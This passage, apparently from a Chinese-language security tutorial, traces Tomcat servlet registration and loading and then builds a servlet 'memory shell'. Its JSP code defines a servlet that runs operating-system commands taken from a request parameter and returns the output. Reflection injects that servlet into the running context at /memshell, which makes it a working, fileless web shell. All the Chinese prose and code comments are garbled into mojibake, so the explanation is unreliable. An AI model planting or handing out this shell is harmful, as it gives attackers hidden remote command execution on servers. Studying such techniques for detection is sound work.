<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">ServletDef</span> <span class="n">servlet</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getServlets</span><span class="o">().</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 1. ÂàõÂª∫‰∏Ä‰∏™WrapperÂØπË±°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">createWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/** ÈÄöËøáweb.xml‰∏≠ÁöÑ&lt;load-on-startup&gt;ÂÖÉÁ¥†Âà§Êñ≠ÊòØÂê¶ÈúÄË¶ÅÂú®ÂêØÂä®Êó∂Âä†ËΩΩ:
</span></span></span><span class="line"><span class="cl"><span class="cm">         * &gt;=0, Ë°®Á§∫‰ºòÂÖàÁ∫ßÔºåÊï∞Â≠óË∂äÂ∞è‰ºòÂÖàÁ∫ßË∂äÈ´òÔºõ
</span></span></span><span class="line"><span class="cl"><span class="cm">         * &lt;0, Ë°®Á§∫Âè™ÊúâÂú®Ë∞ÉÁî®Êó∂ÔºåÊâç‰∏ªÂä®Âä†ËΩΩËøô‰∏™servletÔºõ
</span></span></span><span class="line"><span class="cl"><span class="cm">         * ËøôÂ∞±ÊòØTomcatÁöÑÊáíÂä†ËΩΩÊú∫Âà∂
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">setLoadOnStartup</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">().</span><span class="na">intValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ÈÄöËøáweb.xml‰∏≠ÁöÑ&lt;enabled&gt;Ê†áÁ≠æÊù•Âà§Êñ≠ÊòØÂê¶Ë¶ÅÂêØÁî®ËØ•Servlet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">().</span><span class="na">booleanValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 2. ËÆæÁΩÆWrapperÁöÑÂêçÂ≠ó
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">wrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">params</span> <span class="o">=</span> <span class="n">servlet</span><span class="o">.</span><span class="na">getParameterMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//Âä†ËΩΩ&lt;init-param&gt;ÂÖÉÁ¥†‰∏≠ÁöÑÂÜÖÂÆπ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">params</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">addInitParameter</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">wrapper</span><span class="o">.</span><span class="na">setRunAs</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getRunAs</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 3. ËÆæÁΩÆWrapperÊâÄÂ∞ÅË£ÖÁöÑÁöÑServletÁöÑÁ±ªÂêç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">wrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletClass</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 4. Â∞ÜÂàõÂª∫ÁöÑWrapperÂÆû‰æãÊ∑ªÂä†Âà∞StandardContextÁöÑHashmap childrenÂΩì‰∏≠ÂéªÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// protected final HashMap&lt;String, Container&gt; children = new HashMap&lt;&gt;();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 5. Âä†ËΩΩ&lt;servlet-mapping&gt;ÈÖçÁΩÆÂÜÖÂÆπÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// public void addServletMappingDecoded(String pattern, String name), e.g., pattern=&#34;/myServlet&#34;, name=MyServlet;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">webxml</span><span class="o">.</span><span class="na">getServletMappings</span><span class="o">().</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Êé•ÁùÄÔºåÂíå‰πãÂâç‰∏§‰∏™ÁªÑ‰ª∂‰∏ÄÊ†∑ÔºåTomcat‰ºöÂú®StandardContext#startInternal()‰∏≠Ë∞ÉÁî® <code>loadOnStartup()</code> ÊñπÊ≥ïÊù•ÊáíÂêØÂä®ÈÇ£‰∫õË¢´&lt;load-on-startup&gt;Ê†áËÆ∞‰∏∫ÈúÄË¶ÅÂú®ÂêØÂä®Êó∂Âä†ËΩΩÁöÑServlet: <!-- raw HTML omitted --></p>
<ol>
<li>Ê†πÊçÆloadOnStartupÂà§Êñ≠ËØ•WrapperÊòØÂê¶ÈúÄË¶ÅÂú®ÂêØÂä®Êó∂Ë¢´Âä†ËΩΩ; <!-- raw HTML omitted --></li>
<li>ÂàùÂßãÂåñWrapperÔºåÊúÄÁªàÂ∞Ü‰ºöË∞ÉÁî®servlet.init()Êù•ÂàùÂßãÂåñÂ∞ÅË£ÖÁöÑServlet; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">loadOnStartup</span><span class="o">(</span><span class="n">Container</span> <span class="n">children</span><span class="o">[])</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">TreeMap</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">,</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">Container</span> <span class="n">child</span> <span class="o">:</span> <span class="n">children</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="o">(</span><span class="n">Wrapper</span><span class="o">)</span> <span class="n">child</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">loadOnStartup</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 1. Ê†πÊçÆloadOnStartupÂà§Êñ≠ËØ•WrapperÊòØÂê¶ÈúÄË¶ÅÂú®ÂêØÂä®Êó∂Ë¢´Âä†ËΩΩ;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">loadOnStartup</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">Integer</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">loadOnStartup</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">list</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">list</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">:</span> <span class="n">list</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. ÂàùÂßãÂåñWrapperÔºåÊúÄÁªàÂ∞Ü‰ºöË∞ÉÁî®servlet.init()Êù•ÂàùÂßãÂåñÂ∞ÅË£ÖÁöÑServlet;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">wrapper</span><span class="o">.</span><span class="na">load</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="Ë∞ÉÁî®servlet">Ë∞ÉÁî®Servlet</h4>
<p>Áé∞Âú®ÔºåTomcatÂ∑≤ÁªèÂêØÂä®ÔºåServletÂ∑≤ÁªèË¢´Âä†ËΩΩ‰∫ÜÔºåÊàë‰ª¨ÊúÄÂêéÂ∞±Êù•ÁúãÁúãServletÊó∂Â¶Ç‰ΩïË¢´Ë∞ÉÁî®ÁöÑÔºåÁõ¥Êé•ÁúãË∞ÉÁî®Ê†àÂêßÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-01_08-58-22_screenshot.png"
         alt="Figure 7: service()Ë∞ÉÁî®Ê†à" width="400px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 7: <!-- raw HTML omitted -->service()Ë∞ÉÁî®Ê†à</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>Êàë‰ª¨‰πãÂâçÂú®TomcatË∞ÉÁî®filter‰∏≠‰πü‰ªãÁªçËøáÔºåÂú®ÊâÄÊúâÂØπÂ∫îÁöÑFilterÁªìÊùü <strong>doFilter</strong> ËøáÊª§Êìç‰Ωú‰πãÂêéÂ∞±‰ºöÊâßË°åservice()Ê≠£ÂºèÊé•ÁÆ°ÂíåÂ§ÑÁêÜËØ∑Ê±ÇÔºåÁõ∏ÂÖ≥ÁöÑ‰ªãÁªçÂíåÊàë‰ª¨Âú®filterÈÇ£‰∏ÄËäÇÁúãÂà∞ÁöÑÈáçÂêàÂ∫¶ÂæàÈ´òÔºåÂ∞±‰∏çÂ§öËµòËø∞‰∫ÜÔºåÁÆÄÂçïÂõûÈ°æ‰∏Ä‰∏ã  <code>internalDoFilter()</code> ÂêßÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">internalDoFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">n</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">filters</span><span class="o">[</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span><span class="o">++];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 1. Ê†πÊçÆfilterConfigÊù•Ëé∑ÂèñfilterÂØπË±°;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">filterConfig</span><span class="o">.</span><span class="na">getFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. Ë∞ÉÁî®filterÊú¨Ë∫´ÁöÑdoFilterÊñπÊ≥ïÔºåËøáÊª§Êìç‰ΩúÁªìÊùü‰πãÂêéÂÜç‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™filter;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filter</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">....</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">HttpServletRequest</span> <span class="o">&amp;&amp;</span> <span class="n">response</span> <span class="k">instanceof</span> <span class="n">HttpServletResponse</span> <span class="o">&amp;&amp;</span> <span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 3. ÊâÄÊúâÁöÑfilterÈÉΩdoFilterÊìç‰Ωú‰πãÂêéÔºåÂ∞±‰ºöÊâßË°åÂØπÂ∫îÁöÑservletÁöÑservice()ÊñπÊ≥ïÊ≠£ÂºèÊé•ÁÆ°Â§ÑÁêÜrequest;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">service</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Ëá≥Ê≠§Êàë‰ª¨Â∑≤Áªè‰∫ÜËß£‰∫ÜServletÊòØÂ¶Ç‰ΩïË¢´ÂºÄÂèëÔºåÊ≥®ÂÜåÔºõÂú®TomcatÂêØÂä®‰πãÂêéÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩÂíåË∞ÉÁî®ÁöÑ‰∫ÜÔºåÊé•‰∏ãÊù•Êàë‰ª¨Â∞±ÂèØ‰ª•Ëá™Â∑±ÊÉ≥ÂäûÊ≥ïÂä®ÊÄÅÂú∞Ê≥®ÂÜåÂÜÖÂ≠òÈ©¨‰∫Ü„ÄÇ <!-- raw HTML omitted --></p>
<h3 id="servletÂÜÖÂ≠òÈ©¨">ServletÂÜÖÂ≠òÈ©¨</h3>
<p>Ê†πÊçÆ‰∏ä‰∏ÄËäÇÁöÑÂÜÖÂÆπÔºåÊàë‰ª¨ÂèØ‰ª•ÁΩóÂàó‰∏Ä‰∏ãÔºåÊ≥®ÂÜå‰∏Ä‰∏™ÂèØ‰ª•Ë¢´TomcatÁî®Êù•Ë∞ÉÁî®ÁöÑservletÈúÄË¶Å‰ª•‰∏ãÊ≠•È™§Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>
<p>Ëá™ÂÆö‰πâ‰∏Ä‰∏™ServletÁ±ªÔºåÁªßÊâøServletÔºåÂÆûÁé∞serviceÊñπÊ≥ïÊù•Âä†ÂÖ•Êàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑ‰ª£Á†ÅÔºõ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellServlet</span> <span class="kd">implements</span> <span class="n">Servlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ServletConfig</span> <span class="n">config</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">ServletConfig</span> <span class="nf">getServletConfig</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletResponse</span> <span class="n">res</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;servlet&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">res</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getServletInfo</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>ÂàõÂª∫‰∏Ä‰∏™StandardContextÂØπË±°Ôºõ <!-- raw HTML omitted --></p>
</li>
<li>
<p>ÂàõÂª∫‰∏Ä‰∏™WrapperÂØπË±°: <!-- raw HTML omitted --></p>
<ul>
<li><strong>wrapper.setName</strong> ËÆæÁΩÆwrapperÁöÑÂêçÂ≠ó; <!-- raw HTML omitted --></li>
<li><strong>wrapper.setServletClass</strong> ËÆæÁΩÆwrapper‰∏≠Â∞ÅË£ÖÁöÑServletÁöÑÁ±ªÂêç <!-- raw HTML omitted --></li>
</ul>
</li>
<li>
<p>Â∞ÜWrapperÂØπË±°Âä†ÂÖ•StandardContext: <!-- raw HTML omitted --></p>
<ul>
<li>StandardContext#addChild() Â∞ÜWrapperÂØπË±°Âä†ÂÖ•StandardContextÂØπË±°ÁöÑchildren map‰∏≠; <!-- raw HTML omitted --></li>
<li>StandardContext#addServletMappingDecoded() Ê∑ªÂä†servlet mapping‰ø°ÊÅØ; <!-- raw HTML omitted --></li>
</ul>
</li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. ÂàõÂª∫‰∏Ä‰∏™StandardContextÂØπË±°Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. ÂàõÂª∫‰∏Ä‰∏™StandardWrapperÂØπË±°Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MemShellServlet</span> <span class="n">memShellServlet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellServlet</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardWrapper</span> <span class="n">standardWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StandardWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servlet_name</span> <span class="o">=</span> <span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">MemShellServlet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. Â∞ÜStandardWrapperÂä†ÂÖ•StandardContext‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">standardWrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">&#34;/memshell&#34;</span><span class="o">,</span> <span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
